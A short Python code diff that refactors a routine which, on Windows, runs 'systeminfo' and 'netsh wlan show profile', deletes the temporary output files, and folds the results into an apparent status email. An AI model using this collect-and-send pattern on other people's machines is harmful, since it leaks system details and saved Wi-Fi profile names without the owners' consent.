@@ -36,17 +36,15 @@ def main():
             if operating_system == "Windows":
                 terminal("systeminfo > systeminfo.txt")
                 file = open("systeminfo.txt", "r")
-                systeminfo = file.read()
+                msg = msg + f"systeminfo:\n {file.read()}\n\n"
                 file.close()
                 remove("systeminfo.txt")
-                msg = msg + f"systeminfo:\n {systeminfo}\n\n"
 
                 terminal("netsh wlan show profile > netsh.txt")
                 file = open("netsh.txt", "r")
-                netsh = file.read()
+                msg = msg + f"netsh wlan show profile:\n {file.read()}\n\n"
                 file.close()
                 remove("netsh.txt")
-                msg = msg + f"netsh wlan show profile:\n {netsh}\n\n"
 
             try:
                 print("[INFO]\tSending status email...")
